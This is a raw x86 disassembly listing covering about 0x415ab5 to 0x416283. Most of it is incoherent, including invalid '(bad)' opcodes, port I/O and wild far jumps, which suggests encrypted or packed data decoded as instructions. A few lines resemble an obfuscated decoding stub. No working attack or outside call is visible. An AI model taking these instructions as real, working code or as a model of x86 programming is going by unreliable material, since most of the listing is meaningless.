  415ab5:	mov    ebx,0x4e471871
  415aba:	jns    0x415a61
  415abc:	cmp    al,BYTE PTR [edi-0x4e]
  415abf:	xchg   esi,eax
  415ac0:	in     eax,0x37
  415ac2:	test   eax,0xdc62649c
  415ac7:	enter  0xee3,0x45
  415acb:	jbe    0x415a9d
  415acd:	in     al,dx
  415ace:	ins    DWORD PTR es:[edi],dx
  415acf:	iret   
  415ad0:	aad    0x24
  415ad2:	xlat   BYTE PTR ds:[ebx]
  415ad3:	cmp    cl,BYTE PTR ds:0x67f9a353
  415ad9:	out    dx,eax
  415ada:	jae    0x415a82
  415adc:	aas    
  415add:	push   ebp
  415ade:	fmul   st,st(3)
  415ae0:	jae    0x415b44
  415ae2:	fistp  QWORD PTR [edi]
  415ae4:	add    al,0xa6
  415ae6:	jecxz  0x415aaa
  415ae8:	stos   BYTE PTR es:[edi],al
  415ae9:	lea    ebx,[edi]
  415aeb:	lahf   
  415aec:	mov    ah,0xbb
  415aee:	arpl   cx,di
  415af0:	imul   eax,DWORD PTR [edx+0x12d5aa20],0x1c529512
  415afa:	dec    esp
  415afb:	cmp    esp,DWORD PTR [edi-0x1b047c40]
  415b01:	fst    QWORD PTR [esp+eax*8-0x2b7dab9f]
  415b08:	loop   0x415adf
  415b0a:	outs   dx,DWORD PTR ds:[esi]
  415b0b:	inc    esi
  415b0c:	ret    
  415b0d:	push   edi
  415b0e:	pop    ss
  415b0f:	and    DWORD PTR [eax+0x2c],ebp
  415b12:	mov    ds:0xd41d1281,al
  415b17:	nop
  415b18:	dec    edi
  415b19:	mov    bl,0x3d
  415b1b:	dec    esi
  415b1c:	sbb    ecx,DWORD PTR [ebx+esi*8]
  415b1f:	xchg   ebp,eax
  415b20:	dec    esi
  415b21:	sbb    BYTE PTR [ecx+0x4cf4a194],dh
  415b27:	inc    eax
  415b28:	cmp    cl,dl
  415b2a:	(bad)  
  415b2b:	cwde   
  415b2c:	pop    edi
  415b2d:	(bad)  
  415b2e:	fist   WORD PTR [eax-0x607150e5]
  415b34:	in     eax,dx
  415b35:	std    
  415b36:	and    DWORD PTR [ebp+edx*8+0x422a540b],0xffffff94
  415b3e:	stc    
  415b3f:	(bad)  
  415b40:	mov    ecx,0xa1be50f6
  415b45:	loopne 0x415aeb
  415b47:	(bad)
  415b4a:	add    BYTE PTR [edi+0x18],bh
  415b4d:	hlt    
  415b4e:	fidiv  WORD PTR [ebx-0x53]
  415b51:	xchg   ebx,eax
  415b52:	aas    
  415b53:	fimul  WORD PTR [ecx+0x2237fd62]
  415b59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b5a:	mov    bh,BYTE PTR [ebx-0x55a98094]
  415b60:	int    0x9d
  415b62:	mov    eax,ds:0x1bb3a17f
  415b67:	inc    esp
  415b68:	dec    ecx
  415b69:	pop    edx
  415b6a:	js     0x415ba8
  415b6c:	mov    bl,0x66
  415b6e:	jnp    0x415b9e
  415b70:	popa   
  415b71:	pop    eax
  415b72:	sbb    BYTE PTR [ebx-0x44],al
  415b75:	lods   eax,DWORD PTR ds:[esi]
  415b76:	cs xchg esp,eax
  415b78:	jmp    0x415afd
  415b7a:	fst    st(4)
  415b7c:	xchg   DWORD PTR [edi],ecx
  415b7e:	leave  
  415b7f:	jbe    0x415bfa
  415b81:	mov    ds:0x4c2bc856,eax
  415b86:	aaa    
  415b87:	aad    0x34
  415b89:	inc    edx
  415b8a:	and    ah,dh
  415b8c:	pop    esp
  415b8d:	clc    
  415b8e:	adc    ebp,eax
  415b90:	div    DWORD PTR [ebp-0x19]
  415b93:	mov    bl,0x47
  415b95:	sbb    DWORD PTR [ecx],edi
  415b97:	ror    DWORD PTR [eax+0x39c432c9],1
  415b9d:	jge    0x415b42
  415b9f:	and    al,0x93
  415ba1:	out    0x8b,eax
  415ba3:	loope  0x415b41
  415ba5:	xchg   DWORD PTR [edi+0x72],esi
  415ba8:	xchg   esi,eax
  415ba9:	mov    dl,0xdb
  415bab:	add    al,0x44
  415bad:	ins    DWORD PTR es:[edi],dx
  415bae:	scas   eax,DWORD PTR es:[edi]
  415baf:	mov    cl,0x64
  415bb1:	out    dx,eax
  415bb2:	cmp    DWORD PTR gs:[edi+esi*8],eax
  415bb6:	pop    eax
  415bb7:	into   
  415bb8:	popa   
  415bb9:	or     BYTE PTR [ebp-0x1c],0xb5
  415bbd:	mov    ds:0xb390e94,eax
  415bc2:	push   0xbfbe7f3e
  415bc7:	loop   0x415b5e
  415bc9:	xor    al,0x1e
  415bcb:	iret   
  415bcc:	mov    bh,0x32
  415bce:	imul   esi,DWORD PTR [ebp+0x453ff367],0xffffff98
  415bd5:	imul   eax,DWORD PTR [ecx-0x44],0xb9d1b61f
  415bdc:	xchg   bl,bl
  415bde:	mov    DWORD PTR cs:[ebp-0x6be4c1c6],eax
  415be5:	(bad)  
  415be6:	out    0x71,al
  415be8:	or     al,0x4e
  415bea:	jbe    0x415ba6
  415bec:	aad    0xa6
  415bee:	xchg   esp,eax
  415bef:	xor    al,0xc3
  415bf1:	jg     0x415c62
  415bf3:	add    eax,0xfc10cd6a
  415bf8:	jbe    0x415bef
  415bfa:	pop    ecx
  415bfb:	ror    bl,cl
  415bfd:	shr    ebp,cl
  415bff:	jg     0x415c3d
  415c01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c02:	mov    ah,0xd3
  415c04:	shl    bh,0xab
  415c07:	in     al,dx
  415c08:	push   ss
  415c09:	jecxz  0x415be4
  415c0b:	sub    BYTE PTR [ebp+0x54],dh
  415c0e:	scas   al,BYTE PTR es:[edi]
  415c0f:	aad    0xc7
  415c11:	cwde   
  415c12:	pushf  
  415c13:	mov    ?,WORD PTR [ebx-0x1bb58ee]
  415c19:	nop
  415c1a:	loop   0x415c15
  415c1c:	fadd   st(6),st
  415c1e:	inc    eax
  415c1f:	lea    esp,[ebx]
  415c21:	stos   BYTE PTR es:[edi],al
  415c22:	leave  
  415c23:	test   DWORD PTR [ebx+eax*1-0x6],edx
  415c27:	imul   esp,DWORD PTR [ebp+0x17715a0b],0x7f
  415c2e:	jns    0x415c2a
  415c30:	inc    esi
  415c31:	adc    esi,eax
  415c33:	in     al,0x25
  415c35:	xlat   BYTE PTR ds:[ebx]
  415c36:	aad    0x2c
  415c38:	dec    edi
  415c39:	xor    DWORD PTR [edi+0x70],0x29
  415c3d:	mov    gs,WORD PTR [ecx-0x80]
  415c40:	fwait
  415c41:	sbb    eax,esp
  415c43:	pop    ds
  415c44:	imul   ebp,eax,0x6e
  415c47:	pop    edx
  415c48:	push   cs
  415c49:	jmp    0xa4fa8ff4
  415c4e:	dec    eax
  415c4f:	and    eax,0x5b4087a9
  415c54:	mov    ah,0x57
  415c56:	scas   eax,DWORD PTR es:[edi]
  415c57:	sar    DWORD PTR [edi+0x43750dd9],cl
  415c5d:	cwd    
  415c5f:	fisub  DWORD PTR [edi+0x13]
  415c62:	mov    eax,0x3dc34d69
  415c67:	dec    edx
  415c68:	call   0xaa48ff78
  415c6d:	pop    edi
  415c6e:	push   ebp
  415c6f:	mov    ds:0xa0909e51,eax
  415c74:	bound  esi,QWORD PTR [esi+edi*4+0x18b96db9]
  415c7b:	adc    edx,DWORD PTR [ebx+0x50]
  415c7e:	add    ecx,esp
  415c80:	push   ebx
  415c81:	xchg   ebp,eax
  415c82:	loop   0x415cb4
  415c84:	and    ebp,DWORD PTR [edi+0x2439edb7]
  415c8a:	cmp    DWORD PTR [ebp-0x77],edx
  415c8d:	gs ss dec cl
  415c91:	sbb    dl,ah
  415c93:	cmovne ebx,DWORD PTR [edi+0x18be3c82]
  415c9a:	mov    ds:0x9e9efb0d,eax
  415c9f:	mov    DWORD PTR [edx],ebp
  415ca1:	cs cmc 
  415ca3:	jae    0x415c9a
  415ca5:	test   eax,0x13903efa
  415caa:	jge    0x415d0e
  415cac:	popa   
  415cad:	jns    0x415c58
  415caf:	int    0x3d
  415cb1:	adc    DWORD PTR [ebx-0x6a93f108],ebx
  415cb7:	push   0xffffffd0
  415cb9:	mov    al,ds:0x4f2afaed
  415cbe:	pop    edx
  415cbf:	(bad)  
  415cc0:	fnsave [esi+0x11]
  415cc3:	scas   eax,DWORD PTR es:[edi]
  415cc4:	xor    eax,0xb32aec86
  415cc9:	fadd   QWORD PTR [ebx]
  415ccb:	call   0x6c802249
  415cd0:	pop    edx
  415cd1:	in     eax,dx
  415cd2:	adc    DWORD PTR [ecx+0x5d9836d1],0xffffffa3
  415cd9:	mov    bh,0xe7
  415cdb:	in     al,0x19
  415cdd:	mov    esi,DWORD PTR [edi-0x27]
  415ce0:	push   ss
  415ce1:	std    
  415ce2:	sbb    ch,BYTE PTR [edi]
  415ce4:	add    eax,0x90ace076
  415ce9:	push   eax
  415cea:	xchg   ecx,eax
  415ceb:	push   ecx
  415cec:	outs   dx,DWORD PTR ds:[esi]
  415ced:	jp     0x415cf7
  415cef:	xchg   esp,eax
  415cf0:	ficomp WORD PTR [ebx]
  415cf2:	jmp    0xcdc7cbf0
  415cf7:	imul   ecx,DWORD PTR [ecx+0x2b281e05],0x80edb54c
  415d01:	pop    ecx
  415d02:	les    eax,FWORD PTR [edi]
  415d04:	fadd   st(0),st
  415d06:	push   ebp
  415d07:	xchg   ecx,eax
  415d08:	mov    al,ds:0x4af1a007
  415d0d:	js     0x415ce8
  415d0f:	mov    esi,0xc8789b13
  415d14:	mov    esp,0xf553c5da
  415d19:	daa    
  415d1a:	inc    edi
  415d1b:	inc    edx
  415d1c:	lods   al,BYTE PTR ds:[esi]
  415d1d:	mov    eax,ds:0xc119c971
  415d22:	push   es
  415d23:	js     0x415d60
  415d25:	sub    BYTE PTR [esi+ebp*4-0x4e23e560],bl
  415d2c:	xchg   esi,eax
  415d2d:	inc    ebx
  415d2e:	rol    BYTE PTR [edi+eiz*1+0x4a48abe1],1
  415d35:	and    BYTE PTR [ebx],0x7d
  415d38:	stos   DWORD PTR es:[edi],eax
  415d39:	and    DWORD PTR [edi+0x4f],esi
  415d3c:	imul   ebp,DWORD PTR [edi],0x0
  415d3f:	dec    eax
  415d40:	push   ebp
  415d41:	stc    
  415d42:	push   edi
  415d43:	enter  0x4185,0xcd
  415d47:	push   ss
  415d48:	sahf   
  415d49:	and    DWORD PTR [eax+0xaf45f77],esi
  415d4f:	inc    eax
  415d50:	inc    esi
  415d51:	fsubrp st(1),st
  415d53:	sbb    eax,ecx
  415d55:	and    bl,BYTE PTR [edx-0x761d9ea4]
  415d5b:	mov    BYTE PTR [ebp+esi*1+0x11d2d82a],dl
  415d62:	mov    WORD PTR [ecx+0x2f],?
  415d65:	ret    
  415d66:	mov    eax,0x19085dec
  415d6b:	inc    ecx
  415d6c:	gs jmp 0x415d42
  415d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d70:	cmp    DWORD PTR [ebx+0x2b],ebp
  415d73:	add    eax,0x8b3b15a0
  415d78:	push   ebp
  415d79:	or     BYTE PTR [ebx+0x489dc7d],cl
  415d7f:	xchg   edi,eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	adc    eax,0x8180d844
  415d99:	or     bh,BYTE PTR [edi+0x70]
  415d9c:	mov    ecx,0x3b70707e
  415da1:	sub    dh,BYTE PTR [eax+ebx*8]
  415da4:	repnz inc edx
  415da6:	xchg   ebx,eax
  415da7:	pop    DWORD PTR [edi]
  415da9:	inc    esi
  415daa:	cmc    
  415dab:	xchg   ebx,eax
  415dac:	pop    ecx
  415dad:	fisubr WORD PTR [eax+0x4a433e5a]
  415db3:	mov    bl,0x28
  415db5:	dec    edx
  415db6:	push   eax
  415db7:	das    
  415db8:	imul   edx,DWORD PTR [edx+0x23cf57eb],0xc95454b
  415dc2:	loop   0x415d8b
  415dc4:	xchg   esi,esi
  415dc6:	add    BYTE PTR [eax-0x59ff8b72],dl
  415dcc:	jg     0x415e16
  415dce:	cwde   
  415dcf:	mov    BYTE PTR [eax+esi*1+0x18c97e0e],dl
  415dd6:	pop    esi
  415dd7:	aaa    
  415dd8:	lds    eax,FWORD PTR [ebx+0x2c8a260]
  415dde:	rcr    cl,1
  415de0:	ret    0xe6a2
  415de3:	xor    BYTE PTR [ebx+0x22514817],dh
  415de9:	pop    ss
  415dea:	pop    esp
  415deb:	out    dx,eax
  415dec:	setno  dl
  415def:	test   ecx,esp
  415df1:	mov    ecx,0xe1d404f5
  415df6:	inc    ebx
  415df7:	adc    eax,0xc14fa8ee
  415dfc:	mov    ah,0x56
  415dfe:	pop    ebx
  415dff:	ja     0x415d85
  415e01:	pop    ebp
  415e02:	fmul   QWORD PTR [eax-0x471eb45c]
  415e08:	rcl    DWORD PTR [edx+0x32],cl
  415e0b:	sbb    ebp,DWORD PTR [edi+edx*1]
  415e0e:	pop    esp
  415e0f:	lods   eax,DWORD PTR ds:[esi]
  415e10:	adc    eax,DWORD PTR [edx]
  415e12:	pop    es
  415e13:	lds    edi,FWORD PTR [edx+0x9]
  415e16:	adc    al,0x5
  415e18:	pushf  
  415e19:	test   DWORD PTR [ebx-0x13],0xd31eb3ad
  415e20:	(bad)  
  415e21:	in     eax,dx
  415e22:	(bad)  
  415e23:	push   ebp
  415e24:	mov    eax,0x2a786778
  415e29:	test   BYTE PTR [eax+0x20438ee4],ch
  415e2f:	out    dx,eax
  415e30:	pusha  
  415e31:	clc    
  415e32:	inc    ebx
  415e33:	push   esi
  415e34:	dec    ebp
  415e35:	inc    esi
  415e36:	je     0x415ea3
  415e38:	fnstsw WORD PTR [ecx+0x2b]
  415e3b:	add    eax,0x1c8cfaa6
  415e40:	into   
  415e41:	mov    cl,ch
  415e43:	mov    esi,0x7ca491f9
  415e48:	inc    ebx
  415e49:	in     al,dx
  415e4a:	xor    BYTE PTR [esp-0x7dc20d00],bl
  415e51:	xchg   DWORD PTR [ebp+0x5a],edx
  415e54:	push   ecx
  415e55:	sahf   
  415e56:	ror    BYTE PTR [eax+0x35fc1eff],cl
  415e5c:	ror    BYTE PTR [ebx-0x15],0x64
  415e60:	data16 in al,dx
  415e62:	jo     0x415dfb
  415e64:	xchg   DWORD PTR [ebp-0x74],esp
  415e67:	mov    WORD PTR [edi-0x7113e3f3],gs
  415e6d:	retf   
  415e6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e6f:	add    al,0x4
  415e71:	es loope 0x415e34
  415e74:	popf   
  415e75:	enter  0x1932,0xb
  415e79:	not    BYTE PTR [edi-0x47]
  415e7c:	xchg   ebx,eax
  415e7d:	imul   ecx,DWORD PTR [eax+eax*2-0x4a],0xffffffd2
  415e82:	lock lock inc edi
  415e85:	inc    ebp
  415e86:	push   edx
  415e87:	pop    ss
  415e88:	mov    WORD PTR [esi-0x3a],es
  415e8b:	mov    edi,0x365d54d2
  415e90:	cmp    edi,eax
  415e92:	push   ds
  415e93:	adc    DWORD PTR [edi-0x66],eax
  415e96:	fistp  DWORD PTR [eax]
  415e98:	es inc ebx
  415e9a:	fidivr WORD PTR [esi-0xc2d796c]
  415ea0:	sub    DWORD PTR [ecx],0xa02106ea
  415ea6:	add    DWORD PTR [ebx-0x6c4e2277],0x21
  415ead:	pop    sp
  415eaf:	dec    esi
  415eb0:	sbb    ebx,0xad4a7d79
  415eb6:	cmp    esi,DWORD PTR [eax-0x2a]
  415eb9:	mov    bl,0x60
  415ebb:	mov    eax,ds:0x7036dcbe
  415ec0:	(bad)  
  415ec1:	push   cs
  415ec2:	das    
  415ec3:	aam    0xdf
  415ec5:	aam    0xf2
  415ec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ec8:	in     al,0x3e
  415eca:	int3   
  415ecb:	mov    bl,0x36
  415ecd:	push   ebx
  415ece:	ficomp WORD PTR [esi-0x485905c7]
  415ed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ed5:	or     ecx,esi
  415ed7:	sti    
  415ed8:	lods   al,BYTE PTR ds:[esi]
  415ed9:	fbld   TBYTE PTR [edi]
  415edb:	cdq    
  415edc:	je     0x415f01
  415ede:	sub    eax,0x9dd12243
  415ee3:	mov    al,0x99
  415ee5:	ficom  DWORD PTR [ebp+0x5ec93815]
  415eeb:	loop   0x415ecf
  415eed:	stos   DWORD PTR es:[edi],eax
  415eee:	and    al,0xa3
  415ef0:	pop    es
  415ef1:	adc    al,0xc6
  415ef3:	xor    eax,0x43684e6
  415ef8:	leave  
  415ef9:	arpl   bp,bp
  415efb:	mov    dl,0x70
  415efd:	in     al,0x82
  415eff:	add    BYTE PTR [edx+0x48],al
  415f02:	frstor [edx-0x5a07035d]
  415f08:	push   ebp
  415f09:	test   DWORD PTR [edx-0xcf00eb5],ebx
  415f0f:	repnz push 0xa4afbadd
  415f15:	jbe    0x415ec4
  415f17:	lahf   
  415f18:	jnp    0x415efc
  415f1a:	inc    edi
  415f1b:	sub    ch,BYTE PTR [esi+eiz*4+0x3b]
  415f1f:	jo     0x415f00
  415f21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f22:	jl     0x415f8e
  415f24:	xor    al,0x89
  415f26:	ds (bad) 
  415f29:	jl     0x415f8b
  415f2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f2c:	xchg   edi,eax
  415f2d:	ds sbb al,0x4a
  415f30:	jmp    0xce27e80a
  415f35:	sti    
  415f36:	dec    edx
  415f38:	mov    bl,0xc0
  415f3a:	pop    ebx
  415f3b:	mov    dh,0x6a
  415f3d:	arpl   WORD PTR [ebx-0x9],dx
  415f40:	xchg   edx,eax
  415f41:	daa    
  415f42:	push   esp
  415f43:	cmp    BYTE PTR [edi+0x419426ed],dl
  415f49:	aam    0xc
  415f4b:	dec    edi
  415f4c:	mov    ah,BYTE PTR [edi]
  415f4e:	sbb    DWORD PTR [edx+0xc],0xffffff88
  415f52:	mov    bl,0xab
  415f54:	loop   0x415f07
  415f56:	sbb    edx,edi
  415f58:	mov    ah,BYTE PTR [esi]
  415f5a:	in     al,0xd1
  415f5c:	pop    es
  415f5d:	repz cmp edx,ebx
  415f60:	xor    eax,0x3e06c8f5
  415f65:	in     al,dx
  415f66:	mov    esp,0x44166938
  415f6b:	das    
  415f6c:	fidivr DWORD PTR [esi-0x5]
  415f6f:	not    ebx
  415f71:	out    dx,eax
  415f72:	push   es
  415f73:	(bad)  
  415f74:	ds or  eax,0x5f45ea6c
  415f7a:	mov    fs,WORD PTR ss:[eax+0x207ef3cc]
  415f81:	or     eax,edi
  415f83:	aam    0x41
  415f85:	outs   dx,BYTE PTR ds:[esi]
  415f86:	test   eax,0xf628f74e
  415f8b:	adc    eax,0x2dea6472
  415f90:	iret   
  415f91:	loopne 0x415fc9
  415f93:	int    0xdf
  415f95:	cdq    
  415f96:	and    eax,0x3abeea35
  415f9b:	jne    0x415f3b
  415f9d:	or     DWORD PTR [ebx+0x452be7d0],edx
  415fa3:	pop    eax
  415fa4:	cs int3 
  415fa6:	xor    BYTE PTR [ebx],dh
  415fa8:	jmp    0x6851:0x7344d43f
  415faf:	mov    esp,0x26f6cb87
  415fb4:	push   cs
  415fb5:	xor    bh,dh
  415fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fb8:	push   edx
  415fb9:	loope  0x415f94
  415fbb:	cmp    al,0xe5
  415fbd:	ss ins BYTE PTR es:[edi],dx
  415fbf:	mov    edx,0x1b6ebfa0
  415fc4:	(bad)
  415fc8:	leave  
  415fc9:	in     al,dx
  415fca:	inc    edi
  415fcb:	jmp    0x85901f1d
  415fd0:	loop   0x415f53
  415fd2:	mov    WORD PTR [eax+0x44b11e4f],ds
  415fd8:	push   0x28e29d26
  415fdd:	mov    bh,0x5d
  415fdf:	retf   
  415fe0:	adc    esp,DWORD PTR [ebp-0x46]
  415fe3:	ret    0xcfee
  415fe6:	jb     0x415fb1
  415fe8:	js     0x415fe4
  415fea:	pop    ds
  415feb:	pop    ds
  415fec:	fstp   st(7)
  415fee:	pushf  
  415fef:	jmp    0xd380:0xf2cef96c
  415ff6:	or     edi,esi
  415ff8:	mov    eax,0x29aa66e8
  415ffd:	scas   al,BYTE PTR es:[edi]
  415ffe:	outs   dx,BYTE PTR ds:[esi]
  415fff:	mov    ds,ecx
  416001:	mov    BYTE PTR [esi+0x75e8477f],0xed
  416008:	aaa    
  416009:	call   0xb76cc352
  41600e:	fbstp  TBYTE PTR [ecx+0x6a]
  416011:	rcl    BYTE PTR [edx-0x494f535a],1
  416017:	sbb    al,0x8a
  416019:	and    esi,DWORD PTR [edi+0x719edf72]
  41601f:	out    0x5e,al
  416021:	fisttp QWORD PTR [edx+0x2a]
  416024:	cs pop ecx
  416026:	mov    ebx,0x11d1b8eb
  41602b:	mov    esi,0x45874543
  416030:	pop    ds
  416031:	lods   eax,DWORD PTR ds:[esi]
  416032:	sbb    ch,al
  416034:	clc    
  416035:	sbb    eax,0xca7be74b
  41603a:	mov    bl,0xbb
  41603c:	mov    dh,cl
  41603e:	sub    dl,ah
  416040:	fsubr  st(2),st
  416042:	repnz and edi,DWORD PTR [eax]
  416045:	rol    DWORD PTR [eax+0x7f],cl
  416048:	stc    
  416049:	push   0xffffff81
  41604b:	cmc    
  41604c:	cld    
  41604d:	mov    al,ds:0xe4faa262
  416052:	addr16 sub esi,0x9ab606e7
  416059:	lahf   
  41605a:	add    BYTE PTR [ecx+0x357a4111],bh
  416060:	push   0x3a95e8e9
  416065:	pusha  
  416066:	xchg   esp,eax
  416067:	mov    edx,DWORD PTR [ebp+0x8]
  41606a:	xor    eax,ecx
  41606c:	lea    eax,[eax+edx*1+0x32729c]
  416073:	mov    DWORD PTR [ebp+0x8],eax
  416076:	mov    eax,DWORD PTR [ebp-0x18]
  416079:	mov    edx,DWORD PTR [ebp+0x14]
  41607c:	xor    eax,ecx
  41607e:	add    eax,esi
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x416061
  41609a:	sub    ebx,DWORD PTR [eax]
  41609c:	aaa    
  41609d:	retf   0x7f17
  4160a0:	jo     0x41605b
  4160a2:	jle    0x416114
  4160a4:	jo     0x416057
  4160a6:	and    DWORD PTR ds:0x54fbce93,ebp
  4160ac:	mov    ds:0x5d5b122e,al
  4160b1:	cmp    dh,BYTE PTR [esi]
  4160b3:	int3   
  4160b4:	or     BYTE PTR [ebx],ch
  4160b6:	into   
  4160b7:	sahf   
  4160b8:	inc    esp
  4160b9:	adc    eax,0xe5551f73
  4160be:	adc    eax,0xb6d94189
  4160c3:	sbb    eax,0xc98a734c
  4160c8:	push   ecx
  4160c9:	sub    al,0xb2
  4160cb:	mov    ds:0x1fea099c,al
  4160d0:	into   
  4160d1:	mov    ah,0x1a
  4160d3:	xchg   ecx,eax
  4160d4:	mul    DWORD PTR [eax]
  4160d6:	(bad)  
  4160d7:	aam    0x61
  4160d9:	in     eax,dx
  4160da:	push   edi
  4160db:	or     dl,ch
  4160dd:	dec    esp
  4160de:	std    
  4160df:	mov    edx,0x9313e108
  4160e4:	gs inc edx
  4160e6:	push   edx
  4160e7:	push   edx
  4160e8:	out    0x2e,eax
  4160ea:	lds    edx,FWORD PTR [ebx+0x4fdf92ff]
  4160f0:	inc    ebp
  4160f1:	pop    edi
  4160f2:	adc    al,0x75
  4160f4:	or     BYTE PTR [edx+0x56],ch
  4160f7:	jbe    0x41614b
  4160f9:	jne    0x4160b2
  4160fb:	lds    eax,FWORD PTR [ebp-0x25657b0c]
  416101:	repnz sbb al,ch
  416104:	ins    BYTE PTR es:[edi],dx
  416105:	pop    ebx
  416106:	fstp   QWORD PTR [esi]
  416108:	or     bl,ah
  41610a:	fucom  st(4)
  41610c:	mov    cl,0x7c
  41610e:	cli    
  41610f:	ret    0x3712
  416112:	ins    BYTE PTR es:[edi],dx
  416113:	fmul   QWORD PTR [ecx-0x48180afc]
  416119:	cmp    esp,DWORD PTR [edi]
  41611b:	jb     0x4160ed
  41611d:	ret    
  41611e:	and    DWORD PTR [ecx-0x763f4551],eax
  416124:	cld    
  416125:	sahf   
  416126:	sbb    DWORD PTR [ecx+0x6bf76776],edx
  41612c:	inc    edi
  41612d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41612e:	(bad)  
  416130:	sbb    DWORD PTR [ebx],edx
  416132:	mov    dh,0x55
  416134:	rol    DWORD PTR [ebx+0x26a8d583],1
  41613a:	mov    esi,edi
  41613c:	mov    WORD PTR [ecx+ebx*4+0x35],cs
  416140:	mov    DWORD PTR [ebp+0x52dc4e7b],0x39c58cb4
  41614a:	fistp  DWORD PTR [eax+0x60d39e57]
  416150:	jns    0x416199
  416152:	mov    WORD PTR [ebx-0x2082a439],fs
  416158:	push   ss
  416159:	pop    es
  41615a:	xor    ebx,eax
  41615c:	inc    ebx
  41615e:	(bad)  [ebx+0x29bbe4c]
  416164:	jl     0x4161b2
  416166:	add    ebp,eax
  416168:	mov    ds:0x16aa0401,al
  41616d:	dec    edx
  41616e:	les    ebp,FWORD PTR [edx-0x27]
  416171:	mov    ecx,0x570d06d8
  416176:	ret    
  416177:	call   0x306:0xa32a7f44
  41617e:	iret   
  41617f:	aas    
  416180:	in     al,dx
  416181:	mov    esi,DWORD PTR [ebx+0x1b]
  416184:	mov    edi,0x58a21c90
  416189:	dec    esi
  41618a:	jg     0x416117
  41618c:	mov    ebp,0x8cd9a913
  416191:	mov    es,WORD PTR [edi-0x40]
  416194:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  416196:	sbb    ecx,DWORD PTR [edx-0x1cf29153]
  41619c:	push   esi
  41619d:	outs   dx,BYTE PTR ds:[esi]
  41619e:	and    DWORD PTR [eax],ebp
  4161a0:	mov    ds:0xd0d8fdb6,eax
  4161a5:	lahf   
  4161a6:	mov    bl,0x82
  4161a8:	(bad)  
  4161a9:	or     al,0x1
  4161ab:	jge    0x416175
  4161ad:	(bad)  
  4161ae:	(bad)  
  4161af:	call   FWORD PTR [ecx-0x19]
  4161b2:	sub    BYTE PTR [eax-0x7a],ch
  4161b5:	int3   
  4161b6:	mov    bh,0xe9
  4161b8:	cmp    eax,0x5d8af333
  4161bd:	add    dl,BYTE PTR [ebx+0x7abbffcc]
  4161c3:	sub    al,BYTE PTR [esi+eax*1]
  4161c6:	adc    BYTE PTR [ecx+eiz*2-0x1a2971c0],al
  4161cd:	ins    DWORD PTR es:[edi],dx
  4161ce:	mov    dl,0x2b
  4161d0:	pop    ss
  4161d1:	clc    
  4161d2:	cwde   
  4161d3:	sub    BYTE PTR [ebx],al
  4161d5:	pop    ss
  4161d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161d7:	dec    edx
  4161d8:	cmp    eax,0x11248a4d
  4161dd:	aad    0x13
  4161df:	lods   al,BYTE PTR ds:[esi]
  4161e0:	retf   
  4161e1:	lock in eax,0x94
  4161e4:	push   ecx
  4161e5:	or     DWORD PTR [ecx+0x2f763ef8],esi
  4161eb:	xchg   ecx,eax
  4161ec:	sahf   
  4161ed:	pop    esp
  4161ee:	nop
  4161ef:	mov    edi,0xaf8213e4
  4161f4:	call   0x23a6c715
  4161f9:	call   0x6be:0xfed3e6fb
  416200:	shl    DWORD PTR [eax+eiz*8+0x2b71ecc5],1
  416207:	cmp    ebp,DWORD PTR [edi+0x4ddb4d26]
  41620d:	jnp    0x416196
  41620f:	bound  esp,QWORD PTR [ebp-0x1840a29e]
  416215:	pop    ecx
  416216:	jns    0x41620f
  416218:	daa    
  416219:	pop    ss
  41621a:	or     DWORD PTR [edx+ebp*8],edi
  41621d:	sbb    BYTE PTR [ebx+0x42],ch
  416220:	fwait
  416221:	jns    0x416263
  416223:	(bad)  
  416224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416225:	das    
  416226:	and    ah,bl
  416228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416229:	xor    al,0xf0
  41622b:	mov    dh,0x4d
  41622d:	xchg   edx,eax
  41622e:	call   0x5f8d:0xdd4c8561
  416235:	cmp    ch,BYTE PTR [ebp+ebp*8-0x2bbc0ecc]
  41623c:	xor    BYTE PTR [edi-0x2f18f431],0xbd
  416243:	cdq    
  416244:	imul   esi,DWORD PTR [ebx-0x2c],0xf8ab0787
  41624b:	xchg   edx,eax
  41624c:	sub    edi,ebx
  41624e:	pushf  
  41624f:	mov    bh,0x3d
  416251:	inc    ebx
  416252:	jnp    0x416241
  416254:	sbb    al,0x87
  416256:	mov    ah,0x7b
  416258:	es add dl,cl
  41625b:	daa    
  41625c:	jge    0x41629c
  41625e:	pop    edx
  41625f:	test   al,0x4e
  416261:	cmp    ah,dh
  416263:	dec    esi
  416264:	adc    bl,BYTE PTR [ebx-0xb]
  416267:	lods   al,BYTE PTR ds:[esi]
  416268:	push   ebx
  416269:	sub    ch,BYTE PTR [eax+0x27]
  41626c:	add    edx,eax
  41626e:	pushf  
  41626f:	repz sbb cl,BYTE PTR ss:[esi+0x41]
  416274:	push   eax
  416275:	pop    eax
  416276:	dec    edi
  416277:	scas   al,BYTE PTR es:[edi]
  416278:	lahf   
  416279:	repnz pusha 
  41627b:	fsubr  DWORD PTR [ebp-0x25be4b2c]
  416281:	stc    
  416282:	stc    
  416283:	mov    ebx,0x20f0b00f
